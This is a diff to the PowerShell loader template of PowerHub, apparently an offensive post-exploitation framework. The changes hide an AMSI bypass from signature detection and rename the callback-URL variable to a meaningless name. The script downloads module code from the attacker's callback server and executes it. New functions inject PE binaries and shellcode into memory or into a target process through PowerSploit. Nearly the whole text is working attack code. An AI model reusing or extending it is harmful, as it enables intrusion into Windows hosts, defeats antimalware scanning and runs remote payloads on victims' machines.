@@ -1,4 +1,5 @@
-$CALLBACK_URL = "{{callback_url}}"
+$ErrorActionPreference = "Stop"
+$fsdfds_URL = "{{callback_url}}"
 
 Write-Host @"
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
@@ -9,10 +10,9 @@ Run 'Help-PowerHub' for help
 "@
 
 Try {
-    # Disables Win10 Defender, no admin required
+    # Bypass Win10 Defender, no admin required
     # Reqires some obfuscation
-    $s = "{0}siI{1}tF{2}d" -f "am","ni","aile"
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($s,'NonPublic,Static').SetValue($null,$true)
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSySSFailed'.replace('SySS','Init'),'NonPublic,Static').SetValue($null,$true)
     Write-Host "[+] Disabled AMSI"
 } Catch {
     Write-Host "[-] Failed to disable AMSI"
@@ -32,7 +32,6 @@ $Modules += $m
 {% endfor %}
 {% endif %}
 
-
 function Import-HubModule {
 
     Param(
@@ -40,9 +39,11 @@ function Import-HubModule {
         $Module
     )
 
-    $b64 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Module["code"]))
-    $sb = [Scriptblock]::Create($b64)
-    New-Module -ScriptBlock $sb | Out-Null
+    if ($Module["type"] -eq "ps1") {
+        $b64 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Module["code"]))
+        $sb = [Scriptblock]::Create($b64)
+        New-Module -ScriptBlock $sb | Out-Null
+    }
 
     if ($?){
         Write-Host ("[*] {0} imported." -f $Module["name"])
@@ -147,7 +148,7 @@ Use the '-Verbose' option to print detailed information.
     $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
     foreach ($i in $indices) {
         if ($i -lt $Modules.length -and $i -ge 0) {
-            $Modules[$i]["code"] = $K.downloadstring(("{0}?m={1}" -f $CALLBACK_URL,$i));
+            $Modules[$i]["code"] = $K.downloadstring(("{0}?m={1}" -f $fsdfds_URL,$i));
             Import-HubModule $Modules[$i]
         }
     }
@@ -155,8 +156,45 @@ Use the '-Verbose' option to print detailed information.
 
 
 function Run-Exe {
-    # TODO
+    Param(
+        [parameter(Mandatory=$true)]
+        [Int]
+        $n
+    )
+
+    if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)
+    {
+        $b64 = [System.Convert]::FromBase64String($Modules[$n]["code"])
+        Invoke-ReflectivePEInjection -PEBytes $b64 -ForceASLR
+    } else {
+        Write-Host "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
+    }
 }
+
+function Run-Shellcode {
+    Param(
+        [parameter(Mandatory=$true)]
+        [Int]
+        $n,
+
+        [ValidateNotNullOrEmpty()]
+        [UInt16]
+        $ProcessID
+    )
+
+    if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
+    {
+        $b64 = [System.Convert]::FromBase64String($Modules[$n]["code"])
+        if ($ProcessID) {
+            Invoke-Shellcode -Shellcode $b64 $ProcessID
+        } else {
+            Invoke-Shellcode -Shellcode $b64
+        }
+    } else {
+        Write-Host "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
+    }
+}
+
 
 
 function Help-PowerHub {
@@ -169,3 +207,5 @@ The following functions are available:
 Use 'Get-Help' to learn more about those functions.
 "@
 }
+
+
